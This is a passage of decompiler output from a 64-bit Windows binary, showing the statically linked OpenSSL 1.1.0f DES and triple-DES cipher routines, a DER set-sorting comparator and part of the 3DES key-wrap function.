            *((_DWORD *)v17 - 2) = sub_140053350((unsigned int)&v24, (unsigned int)&v23, a4, -1, a6);
            v17 += 24;
            *((_QWORD *)v17 - 3) = v24;
            ++v16;
          }
          while ( v16 < (int)sub_1400296E0(a1) );
          v15 = v25;
        }
        v18 = sub_1400296E0(a1);
        qsort(v13, v18, 0x18ui64, (_CoreCrtNonSecureSearchSortCompareFunction)sub_140054070);
        v23 = *a2;
        v19 = 0;
        if ( (int)sub_1400296E0(a1) > 0 )
        {
          v20 = (const void **)(v13 + 8);
          do
          {
            memmove(v23, *(v20 - 1), *(int *)v20);
            v21 = *(int *)v20;
            v20 += 3;
            v23 = (char *)v23 + v21;
            ++v19;
          }
          while ( v19 < (int)sub_1400296E0(a1) );
        }
        *a2 = v23;
        if ( a5 == 2 && (int)sub_1400296E0(a1) > 0 )
        {
          v22 = (__int64 *)(v13 + 16);
          do
          {
            sub_1400297E0((__int64)a1, v6, *v22);
            v22 += 3;
            ++v6;
          }
          while ( v6 < (int)sub_1400296E0(a1) );
        }
        sub_14001D930(v13);
        sub_14001D930(v15);
        return 1i64;
      }
      else
      {
        sub_14001D930(v13);
        return 0i64;
      }
    }
  }
  else
  {
    if ( (int)sub_1400296E0(a1) > 0 )
    {
      do
      {
        v24 = sub_140029880((__int64)a1, v6);
        sub_140053350((unsigned int)&v24, (_DWORD)a2, a4, -1, a6);
        ++v6;
      }
      while ( v6 < (int)sub_1400296E0(a1) );
    }
    return 1i64;
  }
  return result;
}
// 140053350: using guessed type __int64 __fastcall sub_140053350(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140053D50) ----------------------------------------------------
__int64 __fastcall sub_140053D50(unsigned int **a1, _BYTE **a2, int *a3, int a4, int a5)
{
  int v5; // edi
  unsigned int **v6; // rbp
  __int64 v7; // rax
  int v9; // r9d
  int v11; // ebx
  int v13; // esi
  int v14; // r12d
  int v15; // r13d
  unsigned int *v16; // rax
  int v17; // ecx
  int v18; // ebp
  int v19; // eax
  int v20; // eax
  int v21; // eax
  int v22; // edi
  unsigned int v23; // ebp
  int v24; // eax
  int v25; // eax
  int v26; // eax
  int v27; // edi
  unsigned int v28; // eax
  unsigned int v29; // ebx
  int v30; // eax
  int v31; // eax
  bool v32; // [rsp+30h] [rbp-58h]
  int v33; // [rsp+34h] [rbp-54h]
  char v34; // [rsp+38h] [rbp-50h]
  int v35; // [rsp+3Ch] [rbp-4Ch]
  int v36; // [rsp+40h] [rbp-48h]
  unsigned int *v37; // [rsp+48h] [rbp-40h]
  __int64 v38; // [rsp+50h] [rbp-38h] BYREF
  __int64 v39; // [rsp+58h] [rbp-30h] BYREF

  v5 = *a3;
  v6 = (unsigned int **)&v38;
  v7 = v38;
  v9 = *a3 & 0x1000;
  if ( v9 )
    v7 = (__int64)a1;
  v38 = v7;
  if ( !v9 )
    v6 = a1;
  v11 = 0;
  if ( (v5 & 0x18) != 0 )
  {
    if ( a4 != -1 )
      return 0xFFFFFFFFi64;
    a4 = a3[1];
    v13 = v5 & 0xC0;
  }
  else if ( a4 == -1 )
  {
    a4 = -1;
    v13 = 0;
  }
  else
  {
    v13 = a5 & 0xC0;
  }
  v14 = a5 & 0xFFFFFF3F;
  v32 = (a5 & 0xFFFFFF3F & v5 & 0x800) != 0;
  v15 = v32 + 1;
  if ( (v5 & 6) == 0 )
  {
    if ( (v5 & 0x10) == 0 )
    {
      v31 = (*((__int64 (**)(void))a3 + 3))();
      return sub_140053350((_DWORD)v6, (_DWORD)a2, v31, a4, v14 | (unsigned int)v13);
    }
    v25 = (*((__int64 (**)(void))a3 + 3))();
    v26 = sub_140053350((_DWORD)v6, 0, v25, -1, v14);
    v27 = v26;
    if ( v26 )
    {
      v28 = sub_140047960(v15, v26, a4);
      v29 = v28;
      if ( a2 )
      {
        if ( v28 != -1 )
        {
          sub_1400479D0(a2, v15, v27, a4, v13);
          v30 = (*((__int64 (**)(void))a3 + 3))();
          sub_140053350((_DWORD)v6, (_DWORD)a2, v30, -1, v14);
          if ( v32 )
            sub_1400479B0((_WORD **)a2);
        }
      }
      return v29;
    }
    return 0i64;
  }
  v16 = *v6;
  v37 = *v6;
  if ( !*v6 )
    return 0i64;
  v17 = 0;
  if ( (v5 & 2) != 0 )
  {
    LOBYTE(v17) = (v5 & 4) != 0;
    v35 = ++v17;
  }
  else
  {
    v35 = 0;
  }
  if ( a4 == -1 || (v5 & 0x10) != 0 )
  {
    v34 = 0;
    v33 = (v17 != 0) + 16;
  }
  else
  {
    v33 = a4;
    v34 = v13;
  }
  v18 = 0;
  if ( (int)sub_1400296E0(v16) > 0 )
  {
    do
    {
      v39 = sub_140029880((__int64)v37, v18);
      v19 = (*((__int64 (**)(void))a3 + 3))();
      v20 = sub_140053350((unsigned int)&v39, 0, v19, -1, v14);
      if ( v20 == -1 || v11 > 0x7FFFFFFF - v20 )
        return 0xFFFFFFFFi64;
      v11 += v20;
    }
    while ( ++v18 < (int)sub_1400296E0(v37) );
  }
  v21 = sub_140047960(v15, v11, v33);
  v36 = v21;
  if ( v21 == -1 )
    return 0xFFFFFFFFi64;
  v22 = v5 & 0x10;
  if ( v22 )
  {
    v23 = sub_140047960(v15, v21, a4);
    v21 = v36;
  }
  else
  {
    v23 = v21;
  }
  if ( a2 && v23 != -1 )
  {
    if ( v22 )
      sub_1400479D0(a2, v15, v21, a4, v13);
    sub_1400479D0(a2, v15, v11, v33, v34);
    v24 = (*((__int64 (**)(void))a3 + 3))();
    sub_140053AB0(v37, (void **)a2, v11, v24, v35, v14);
    if ( v32 )
    {
      sub_1400479B0((_WORD **)a2);
      if ( v22 )
        sub_1400479B0((_WORD **)a2);
    }
  }
  return v23;
}
// 140053350: using guessed type __int64 __fastcall sub_140053350(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140054070) ----------------------------------------------------
int __fastcall sub_140054070(_DWORD *a1, _DWORD *a2)
{
  int v2; // ebx
  int v3; // edi
  int v4; // eax
  const void *v5; // rdx
  const void *v6; // rcx
  int result; // eax

  v2 = a1[2];
  v3 = a2[2];
  v4 = v3;
  v5 = *(const void **)a2;
  v6 = *(const void **)a1;
  if ( v2 < v3 )
    v4 = v2;
  result = memcmp(v6, v5, v4);
  if ( !result )
    return v2 - v3;
  return result;
}

//----- (00000001400540C0) ----------------------------------------------------
__int64 __fastcall sub_1400540C0(__int64 a1, unsigned __int16 *a2)
{
  _DWORD *v4; // rax

  *(_QWORD *)(sub_140024D00(a1) + 128) = 0i64;
  v4 = (_DWORD *)sub_140024D00(a1);
  sub_140086770(a2, v4);
  return 1i64;
}

//----- (0000000140054110) ----------------------------------------------------
__int64 __fastcall sub_140054110(__int64 a1, int a2, __int64 a3, unsigned __int8 *a4)
{
  if ( a2 != 6 )
    return 0xFFFFFFFFi64;
  if ( (int)sub_140025460((__int64)a4, 8u) <= 0 )
    return 0i64;
  sub_140086A20(a4);
  return 1i64;
}

//----- (0000000140054160) ----------------------------------------------------
__int64 __fastcall sub_140054160(__int64 a1, __int64 a2, unsigned __int8 *a3, unsigned __int64 a4)
{
  unsigned __int64 v8; // r12
  unsigned __int64 v9; // rsi
  __int64 v10; // r15
  __int64 v11; // r14
  int v12; // ebx
  unsigned int *v13; // rax

  v8 = *(int *)(sub_140021BD0(a1) + 4);
  if ( a4 >= v8 )
  {
    v9 = a4 - v8;
    v10 = a2 - (_QWORD)a3;
    v11 = -(__int64)a3;
    do
    {
      v12 = sub_140024CF0(a1);
      v13 = (unsigned int *)sub_140024D00(a1);
      sub_1400866A0(a3, (__int64)&a3[v10], v13, v12);
      a3 += v8;
    }
    while ( (unsigned __int64)&a3[v11] <= v9 );
  }
  return 1i64;
}

//----- (0000000140054210) ----------------------------------------------------
__int64 __fastcall sub_140054210(__int64 a1, __int64 a2, _BYTE *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbp
  unsigned __int64 v8; // rsi
  unsigned __int8 *v9; // rbx
  __int64 v10; // rax
  unsigned __int8 *v11; // rbx
  __int64 v12; // rax
  int v14; // [rsp+68h] [rbp+20h] BYREF

  v4 = a4;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v4 = -1073741824i64 * (a4 >> 30) + a4;
    do
    {
      v14 = sub_140024D40(a1);
      v9 = (unsigned __int8 *)sub_140024D20(a1);
      v10 = sub_140024D00(a1);
      sub_140086CB0(a3, a2, 0x40000000, v10, v9, &v14);
      sub_140024D70(a1, v14);
      a3 += 0x40000000;
      a2 += 0x40000000i64;
      --v8;
    }
    while ( v8 );
  }
  if ( v4 )
  {
    v14 = sub_140024D40(a1);
    v11 = (unsigned __int8 *)sub_140024D20(a1);
    v12 = sub_140024D00(a1);
    sub_140086CB0(a3, a2, v4, v12, v11, &v14);
    sub_140024D70(a1, v14);
  }
  return 1i64;
}

//----- (0000000140054330) ----------------------------------------------------
__int64 __fastcall sub_140054330(__int64 a1, __int64 a2, unsigned __int16 *a3, unsigned __int64 a4)
{
  __int64 v8; // rbx
  __int64 v9; // rax
  unsigned __int64 v10; // r14
  int v11; // edi
  unsigned __int16 *v12; // rbx
  unsigned int *v13; // rax
  int v14; // edi
  unsigned __int16 *v15; // rbx
  unsigned int *v16; // rax

  v8 = sub_140024D00(a1);
  if ( *(_QWORD *)(v8 + 128) )
  {
    v9 = sub_140024D20(a1);
    (*(void (__fastcall **)(unsigned __int16 *, __int64, unsigned __int64, __int64, __int64))(v8 + 128))(
      a3,
      a2,
      a4,
      v8,
      v9);
  }
  else
  {
    if ( a4 >= 0x40000000 )
    {
      v10 = a4 >> 30;
      a4 += -1073741824i64 * (a4 >> 30);
      do
      {
        v11 = sub_140024CF0(a1);
        v12 = (unsigned __int16 *)sub_140024D20(a1);
        v13 = (unsigned int *)sub_140024D00(a1);
        sub_140085A00(a3, a2, 0x40000000u, v13, v12, v11);
        a3 += 0x20000000;
        a2 += 0x40000000i64;
        --v10;
      }
      while ( v10 );
    }
    if ( a4 )
    {
      v14 = sub_140024CF0(a1);
      v15 = (unsigned __int16 *)sub_140024D20(a1);
      v16 = (unsigned int *)sub_140024D00(a1);
      sub_140085A00(a3, a2, a4, v16, v15, v14);
    }
  }
  return 1i64;
}

//----- (0000000140054460) ----------------------------------------------------
__int64 __fastcall sub_140054460(__int64 a1, _BYTE *a2, char *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbp
  unsigned __int64 v8; // r14
  int v9; // ebx
  unsigned __int16 *v10; // rdi
  unsigned int *v11; // rax
  int v12; // ebx
  unsigned __int16 *v13; // rdi
  unsigned int *v14; // rax
  int v16; // [rsp+88h] [rbp+20h] BYREF

  v4 = a4;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v4 = -1073741824i64 * (a4 >> 30) + a4;
    do
    {
      v16 = sub_140024D40(a1);
      v9 = sub_140024CF0(a1);
      v10 = (unsigned __int16 *)sub_140024D20(a1);
      v11 = (unsigned int *)sub_140024D00(a1);
      sub_140086A80(a3, a2, 0x40000000, v11, v10, &v16, v9);
      sub_140024D70(a1, v16);
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v8;
    }
    while ( v8 );
  }
  if ( v4 )
  {
    v16 = sub_140024D40(a1);
    v12 = sub_140024CF0(a1);
    v13 = (unsigned __int16 *)sub_140024D20(a1);
    v14 = (unsigned int *)sub_140024D00(a1);
    sub_140086A80(a3, a2, v4, v14, v13, &v16, v12);
    sub_140024D70(a1, v16);
  }
  return 1i64;
}

//----- (00000001400545B0) ----------------------------------------------------
__int64 __fastcall sub_1400545B0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbx
  unsigned __int64 v5; // rbp
  __int64 v8; // rdi
  unsigned __int64 v9; // r15
  unsigned __int64 v10; // r14
  int v11; // esi
  unsigned __int8 *v12; // rdi
  unsigned int *v13; // rax
  int v14; // edx
  char v15; // cl
  unsigned __int64 v16; // rcx
  char v18; // [rsp+40h] [rbp-48h] BYREF
  char v19[15]; // [rsp+41h] [rbp-47h] BYREF
  unsigned __int64 v21; // [rsp+A8h] [rbp+20h]

  v21 = a4;
  v4 = a4;
  v5 = a4;
  if ( a4 >= 0x8000000 )
    v4 = 0x8000000i64;
  v8 = a1;
  if ( !a4 )
    return 1i64;
  do
  {
    if ( v5 < v4 )
      break;
    v9 = 0i64;
    if ( 8 * v4 )
    {
      do
      {
        v10 = v9 >> 3;
        v18 = (*(_BYTE *)((v9 >> 3) + a3) & (unsigned __int8)(1 << (7 - (v9 & 7)))) != 0 ? 0x80 : 0;
        v11 = sub_140024CF0(v8);
        v12 = (unsigned __int8 *)sub_140024D20(v8);
        v13 = (unsigned int *)sub_140024D00(a1);
        sub_140085F80((__int64)&v18, (__int64)v19, 1, 1u, v13, v12, v11);
        v8 = a1;
        v14 = 128 >> (v9 & 7);
        v15 = v9++ & 7;
        *(_BYTE *)(v10 + a2) = ((unsigned __int8)(v19[0] & 0x80) >> v15) | *(_BYTE *)(v10 + a2) & ~(_BYTE)v14;
      }
      while ( v9 < 8 * v4 );
      v5 = v21;
    }
    v5 -= v4;
    a3 += v4;
    a2 += v4;
    v21 = v5;
    v16 = v5;
    if ( v5 >= v4 )
      v16 = v4;
    v4 = v16;
  }
  while ( v5 );
  return 1i64;
}
// 1400545B0: using guessed type char var_47[15];

//----- (0000000140054750) ----------------------------------------------------
__int64 __fastcall sub_140054750(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbp
  unsigned __int64 v8; // rsi
  int v9; // edi
  unsigned __int8 *v10; // rbx
  unsigned int *v11; // rax
  int v12; // edi
  unsigned __int8 *v13; // rbx
  unsigned int *v14; // rax

  v4 = a4;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v4 = -1073741824i64 * (a4 >> 30) + a4;
    do
    {
      v9 = sub_140024CF0(a1);
      v10 = (unsigned __int8 *)sub_140024D20(a1);
      v11 = (unsigned int *)sub_140024D00(a1);
      sub_140085F80(a3, a2, 8, 0x40000000u, v11, v10, v9);
      a3 += 0x40000000i64;
      a2 += 0x40000000i64;
      --v8;
    }
    while ( v8 );
  }
  if ( v4 )
  {
    v12 = sub_140024CF0(a1);
    v13 = (unsigned __int8 *)sub_140024D20(a1);
    v14 = (unsigned int *)sub_140024D00(a1);
    sub_140085F80(a3, a2, 8, v4, v14, v13, v12);
  }
  return 1i64;
}

//----- (0000000140054860) ----------------------------------------------------
void *sub_140054860()
{
  return &unk_1400F84F0;
}

//----- (0000000140054870) ----------------------------------------------------
void *sub_140054870()
{
  return &unk_1400F8670;
}

//----- (0000000140054880) ----------------------------------------------------
void *sub_140054880()
{
  return &unk_1400F8550;
}

//----- (0000000140054890) ----------------------------------------------------
void *sub_140054890()
{
  return &unk_1400F86D0;
}

//----- (00000001400548A0) ----------------------------------------------------
void *sub_1400548A0()
{
  return &unk_1400F8610;
}

//----- (00000001400548B0) ----------------------------------------------------
void *sub_1400548B0()
{
  return &unk_1400F85B0;
}

//----- (00000001400548C0) ----------------------------------------------------
__int64 __fastcall sub_1400548C0(__int64 a1, unsigned __int8 *a2, void *a3, size_t a4)
{
  if ( a4 >= 0x40000000 || (a4 & 7) != 0 )
    return 0xFFFFFFFFi64;
  if ( (unsigned int)sub_14001C310((__int64)a2, (__int64)a3, a4) )
  {
    sub_140024610(6, 171, 162, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\e_des3.c", 398);
    return 0i64;
  }
  else if ( (unsigned int)sub_140024CF0(a1) )
  {
    return sub_1400556D0(a1, a2, a3, a4);
  }
  else
  {
    return sub_140055480(a1, (__int64)a2, (unsigned __int16 *)a3, a4);
  }
}

//----- (0000000140054970) ----------------------------------------------------
__int64 __fastcall sub_140054970(__int64 a1, unsigned __int16 *a2)
{
  __int64 v3; // rdi
  __int64 result; // rax
  __int128 v5; // xmm1
  __int128 v6; // xmm0
  __int128 v7; // xmm1
  __int128 v8; // xmm0
  __int128 v9; // xmm1
  __int128 v10; // xmm0
  __int128 v11; // xmm1

  v3 = sub_140024D00(a1);
  *(_QWORD *)(v3 + 384) = 0i64;
  sub_140086770(a2, (_DWORD *)v3);
  sub_140086770(a2 + 4, (_DWORD *)(v3 + 128));
  result = 1i64;
  v5 = *(_OWORD *)(v3 + 16);
  *(_OWORD *)(v3 + 256) = *(_OWORD *)v3;
  v6 = *(_OWORD *)(v3 + 32);
  *(_OWORD *)(v3 + 272) = v5;
  v7 = *(_OWORD *)(v3 + 48);
  *(_OWORD *)(v3 + 288) = v6;
  v8 = *(_OWORD *)(v3 + 64);
  *(_OWORD *)(v3 + 304) = v7;
  v9 = *(_OWORD *)(v3 + 80);
  *(_OWORD *)(v3 + 320) = v8;
  v10 = *(_OWORD *)(v3 + 96);
  *(_OWORD *)(v3 + 336) = v9;
  v11 = *(_OWORD *)(v3 + 112);
  *(_OWORD *)(v3 + 352) = v10;
  *(_OWORD *)(v3 + 368) = v11;
  return result;
}

//----- (0000000140054A20) ----------------------------------------------------
__int64 __fastcall sub_140054A20(__int64 a1, unsigned __int16 *a2)
{
  __int64 v3; // rbx

  v3 = sub_140024D00(a1);
  *(_QWORD *)(v3 + 384) = 0i64;
  sub_140086770(a2, (_DWORD *)v3);
  sub_140086770(a2 + 4, (_DWORD *)(v3 + 128));
  sub_140086770(a2 + 8, (_DWORD *)(v3 + 256));
  return 1i64;
}

//----- (0000000140054A90) ----------------------------------------------------
__int64 __fastcall sub_140054A90(__int64 a1, int a2, __int64 a3, unsigned __int8 *a4)
{
  unsigned int v7; // eax

  if ( a2 != 6 )
    return 0xFFFFFFFFi64;
  v7 = sub_140024D30(a1);
  if ( (int)sub_140025460((__int64)a4, v7) <= 0 )
    return 0i64;
  sub_140086A20(a4);
  if ( (int)sub_140024D30(a1) >= 16 )
    sub_140086A20(a4 + 8);
  if ( (int)sub_140024D30(a1) >= 24 )
    sub_140086A20(a4 + 16);
  return 1i64;
}

//----- (0000000140054B20) ----------------------------------------------------
__int64 __fastcall sub_140054B20(__int64 a1, __int64 a2, unsigned __int8 *a3, unsigned __int64 a4)
{
  unsigned __int64 v8; // r13
  unsigned __int64 v9; // r15
  __int64 v10; // r12
  int v11; // esi
  unsigned int *v12; // rdi
  __int64 v13; // rbx
  unsigned int *v14; // rax
  __int64 v16; // [rsp+78h] [rbp+20h]

  v8 = *(int *)(sub_140021BD0(a1) + 4);
  if ( a4 >= v8 )
  {
    v9 = a4 - v8;
    v10 = a2 - (_QWORD)a3;
    v16 = -(__int64)a3;
    do
    {
      v11 = sub_140024CF0(a1);
      v12 = (unsigned int *)(sub_140024D00(a1) + 256);
      v13 = sub_140024D00(a1);
      v14 = (unsigned int *)sub_140024D00(a1);
      sub_140086EA0(a3, (__int64)&a3[v10], v14, (unsigned int *)(v13 + 128), v12, v11);
      a3 += v8;
    }
    while ( (unsigned __int64)&a3[v16] <= v9 );
  }
  return 1i64;
}

//----- (0000000140054C00) ----------------------------------------------------
__int64 __fastcall sub_140054C00(__int64 a1, __int64 a2, _BYTE *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // r14
  unsigned __int64 v8; // r15
  unsigned __int8 *v9; // rsi
  unsigned int *v10; // rdi
  unsigned int *v11; // rbx
  __int64 v12; // rax
  unsigned __int8 *v13; // rsi
  unsigned int *v14; // rdi
  unsigned int *v15; // rbx
  __int64 v16; // rax
  int v18; // [rsp+88h] [rbp+20h] BYREF

  v4 = a4;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v4 = -1073741824i64 * (a4 >> 30) + a4;
    do
    {
      v18 = sub_140024D40(a1);
      v9 = (unsigned __int8 *)sub_140024D20(a1);
      v10 = (unsigned int *)(sub_140024D00(a1) + 256);
      v11 = (unsigned int *)(sub_140024D00(a1) + 128);
      v12 = sub_140024D00(a1);
      sub_140087AA0(a3, a2, 0x40000000, v12, v11, v10, v9, &v18);
      sub_140024D70(a1, v18);
      a3 += 0x40000000;
      a2 += 0x40000000i64;
      --v8;
    }
    while ( v8 );
  }
  if ( v4 )
  {
    v18 = sub_140024D40(a1);
    v13 = (unsigned __int8 *)sub_140024D20(a1);
    v14 = (unsigned int *)(sub_140024D00(a1) + 256);
    v15 = (unsigned int *)(sub_140024D00(a1) + 128);
    v16 = sub_140024D00(a1);
    sub_140087AA0(a3, a2, v4, v16, v15, v14, v13, &v18);
    sub_140024D70(a1, v18);
  }
  return 1i64;
}

//----- (0000000140054D90) ----------------------------------------------------
__int64 __fastcall sub_140054D90(__int64 a1, __int64 a2, unsigned __int16 *a3, unsigned __int64 a4)
{
  __int64 v8; // rax
  __int64 v9; // rdi
  __int64 v10; // rax
  unsigned __int64 v12; // rbp
  unsigned int *v13; // r13
  int v14; // ebx
  unsigned __int16 *v15; // rax
  int v16; // ebx
  unsigned __int16 *v17; // rax

  v8 = sub_140024D00(a1);
  v9 = v8;
  if ( *(_QWORD *)(v8 + 384) )
  {
    v10 = sub_140024D20(a1);
    (*(void (__fastcall **)(unsigned __int16 *, __int64, unsigned __int64, __int64, __int64))(v9 + 384))(
      a3,
      a2,
      a4,
      v9,
      v10);
    return 1i64;
  }
  else
  {
    if ( a4 >= 0x40000000 )
    {
      v12 = a4 >> 30;
      v13 = (unsigned int *)(v8 + 256);
      do
      {
        v14 = sub_140024CF0(a1);
        v15 = (unsigned __int16 *)sub_140024D20(a1);
        sub_140082CA0(a3, a2, 0x40000000, v9, (unsigned int *)(v9 + 128), v13, v15, v14);
        a3 += 0x20000000;
        a2 += 0x40000000i64;
        --v12;
      }
      while ( v12 );
      a4 += -1073741824i64 * (a4 >> 30);
    }
    if ( a4 )
    {
      v16 = sub_140024CF0(a1);
      v17 = (unsigned __int16 *)sub_140024D20(a1);
      sub_140082CA0(a3, a2, a4, v9, (unsigned int *)(v9 + 128), (unsigned int *)(v9 + 256), v17, v16);
    }
    return 1i64;
  }
}

//----- (0000000140054F10) ----------------------------------------------------
__int64 __fastcall sub_140054F10(__int64 a1, _BYTE *a2, char *a3, unsigned __int64 a4)
{
  __int64 v4; // r15
  _BYTE *v6; // r12
  unsigned __int64 v8; // r12
  _BYTE *v9; // r15
  int v10; // esi
  __int64 v11; // rbp
  unsigned int *v12; // rdi
  unsigned int *v13; // rbx
  unsigned int *v14; // rax
  int v15; // esi
  __int64 v16; // rbp
  unsigned int *v17; // rdi
  unsigned int *v18; // rbx
  unsigned int *v19; // rax
  __int64 v21; // [rsp+40h] [rbp-58h]
  int v22[18]; // [rsp+50h] [rbp-48h] BYREF
  _BYTE *v23; // [rsp+A8h] [rbp+10h]
  unsigned __int64 v24; // [rsp+B8h] [rbp+20h] BYREF

  v4 = a4;
  v6 = a2;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v24 = -1073741824i64 * (a4 >> 30) + a4;
    v9 = a2;
    do
    {
      v22[0] = sub_140024D40(a1);
      v10 = sub_140024CF0(a1);
      v11 = sub_140024D20(a1);
      v12 = (unsigned int *)(sub_140024D00(a1) + 256);
      v13 = (unsigned int *)(sub_140024D00(a1) + 128);
      v14 = (unsigned int *)sub_140024D00(a1);
      LODWORD(v21) = v10;
      sub_140086F90(a3, v9, 0x40000000, v14, v13, v12, v11, v22, v21);
      sub_140024D70(a1, v22[0]);
      a3 += 0x40000000;
      v9 += 0x40000000;
      --v8;
    }
    while ( v8 );
    v23 = v9;
    v4 = v24;
    v6 = v23;
  }
  if ( v4 )
  {
    LODWORD(v24) = sub_140024D40(a1);
    v15 = sub_140024CF0(a1);
    v16 = sub_140024D20(a1);
    v17 = (unsigned int *)(sub_140024D00(a1) + 256);
    v18 = (unsigned int *)(sub_140024D00(a1) + 128);
    v19 = (unsigned int *)sub_140024D00(a1);
    LODWORD(v21) = v15;
    sub_140086F90(a3, v6, v4, v19, v18, v17, v16, &v24, v21);
    sub_140024D70(a1, v24);
  }
  return 1i64;
}
// 140054FE3: variable 'v21' is possibly undefined
// 140054F10: using guessed type int var_48[18];

//----- (00000001400550E0) ----------------------------------------------------
__int64 __fastcall sub_1400550E0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  __int64 v5; // rbx
  unsigned __int64 i; // r12
  unsigned __int64 v8; // r14
  int v9; // ebp
  unsigned __int8 *v10; // rsi
  unsigned int *v11; // rdi
  unsigned int *v12; // rbx
  unsigned int *v13; // rax
  int v14; // edx
  char v15; // cl
  char v17[16]; // [rsp+50h] [rbp-48h] BYREF
  char v20; // [rsp+B8h] [rbp+20h] BYREF

  v5 = a3;
  if ( !(unsigned int)sub_140024D80(a1, 0x2000u) )
    a4 *= 8i64;
  for ( i = 0i64;
        i < a4;
        *(_BYTE *)(v8 + a2) = ((unsigned __int8)(v17[0] & 0x80) >> v15) | *(_BYTE *)(v8 + a2) & ~(_BYTE)v14 )
  {
    v8 = i >> 3;
    v20 = (*(_BYTE *)((i >> 3) + v5) & (unsigned __int8)(1 << (7 - (i & 7)))) != 0 ? 0x80 : 0;
    v9 = sub_140024CF0(a1);
    v10 = (unsigned __int8 *)sub_140024D20(a1);
    v11 = (unsigned int *)(sub_140024D00(a1) + 256);
    v12 = (unsigned int *)(sub_140024D00(a1) + 128);
    v13 = (unsigned int *)sub_140024D00(a1);
    sub_140087210((__int64)&v20, (__int64)v17, 1, 1u, v13, v12, v11, v10, v9);
    v5 = a3;
    v14 = 128 >> (i & 7);
    v15 = i++ & 7;
  }
  return 1i64;
}
// 1400550E0: using guessed type char var_48[16];

//----- (0000000140055250) ----------------------------------------------------
__int64 __fastcall sub_140055250(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // r15
  __int64 v6; // r12
  unsigned __int64 v8; // r12
  __int64 v9; // r15
  int v10; // ebp
  unsigned __int8 *v11; // rsi
  unsigned int *v12; // rdi
  unsigned int *v13; // rbx
  unsigned int *v14; // rax
  int v15; // ebp
  unsigned __int8 *v16; // rsi
  unsigned int *v17; // rdi
  unsigned int *v18; // rbx
  unsigned int *v19; // rax
  __int64 v21; // [rsp+98h] [rbp+10h]
  unsigned __int64 v22; // [rsp+A8h] [rbp+20h]

  v4 = a4;
  v6 = a2;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v22 = -1073741824i64 * (a4 >> 30) + a4;
    v9 = a2;
    do
    {
      v10 = sub_140024CF0(a1);
      v11 = (unsigned __int8 *)sub_140024D20(a1);
      v12 = (unsigned int *)(sub_140024D00(a1) + 256);
      v13 = (unsigned int *)(sub_140024D00(a1) + 128);
      v14 = (unsigned int *)sub_140024D00(a1);
      sub_140087210(a3, v9, 8, 0x40000000u, v14, v13, v12, v11, v10);
      a3 += 0x40000000i64;
      v9 += 0x40000000i64;
      --v8;
    }
    while ( v8 );
    v21 = v9;
    v4 = v22;
    v6 = v21;
  }
  if ( v4 )
  {
    v15 = sub_140024CF0(a1);
    v16 = (unsigned __int8 *)sub_140024D20(a1);
    v17 = (unsigned int *)(sub_140024D00(a1) + 256);
    v18 = (unsigned int *)(sub_140024D00(a1) + 128);
    v19 = (unsigned int *)sub_140024D00(a1);
    sub_140087210(a3, v6, 8, v4, v19, v18, v17, v16, v15);
  }
  return 1i64;
}

//----- (00000001400553D0) ----------------------------------------------------
void *sub_1400553D0()
{
  return &unk_1400F8A30;
}

//----- (00000001400553E0) ----------------------------------------------------
void *sub_1400553E0()
{
  return &unk_1400F8790;
}

//----- (00000001400553F0) ----------------------------------------------------
void *sub_1400553F0()
{
  return &unk_1400F8A90;
}

//----- (0000000140055400) ----------------------------------------------------
void *sub_140055400()
{
  return &unk_1400F87F0;
}

//----- (0000000140055410) ----------------------------------------------------
void *sub_140055410()
{
  return &unk_1400F8AF0;
}

//----- (0000000140055420) ----------------------------------------------------
void *sub_140055420()
{
  return &unk_1400F8850;
}

//----- (0000000140055430) ----------------------------------------------------
void *sub_140055430()
{
  return &unk_1400F8730;
}

//----- (0000000140055440) ----------------------------------------------------
void *sub_140055440()
{
  return &unk_1400F88B0;
}

//----- (0000000140055450) ----------------------------------------------------
void *sub_140055450()
{
  return &unk_1400F8910;
}

//----- (0000000140055460) ----------------------------------------------------
void *sub_140055460()
{
  return &unk_1400F8970;
}

//----- (0000000140055470) ----------------------------------------------------
void *sub_140055470()
{
  return &unk_1400F89D0;
}

//----- (0000000140055480) ----------------------------------------------------
unsigned __int64 __fastcall sub_140055480(__int64 a1, __int64 a2, unsigned __int16 *a3, unsigned __int64 a4)
{
  unsigned int v4; // r14d
  unsigned __int8 *v10; // rax
  __int64 v11; // r15
  __int64 v12; // rax
  int v13; // ebx
  unsigned __int16 *v14; // rax
  __int64 v15; // rax
  unsigned __int16 v16; // [rsp+40h] [rbp-68h] BYREF
  unsigned __int8 v17[8]; // [rsp+48h] [rbp-60h] BYREF
  char v18[24]; // [rsp+50h] [rbp-58h] BYREF

  v4 = -1;
  if ( a4 >= 0x18 )
  {
    if ( !a2 )
      return a4 - 16;
    *(_QWORD *)sub_140024D20(a1) = 0x521E8792CA2DD4Ai64;
    sub_140054D90(a1, (__int64)&v16, a3, 8ui64);
    if ( (unsigned __int16 *)a2 == a3 )
    {
      memmove((void *)a2, (const void *)(a2 + 8), a4 - 8);
      a3 -= 4;
    }
    sub_140054D90(a1, a2, a3 + 4, a4 - 16);
    sub_140054D90(a1, (__int64)v17, (unsigned __int16 *)((char *)a3 + a4 - 8), 8ui64);
    sub_140082660((unsigned __int8 *)&v16, 0i64, 8ui64);
    sub_140082660((unsigned __int8 *)a2, 0i64, a4 - 16);
    v10 = (unsigned __int8 *)sub_140024D20(a1);
    sub_140082660(v10, v17, 8ui64);
    sub_140054D90(a1, a2, (unsigned __int16 *)a2, a4 - 16);
    v11 = sub_140024D00(a1);
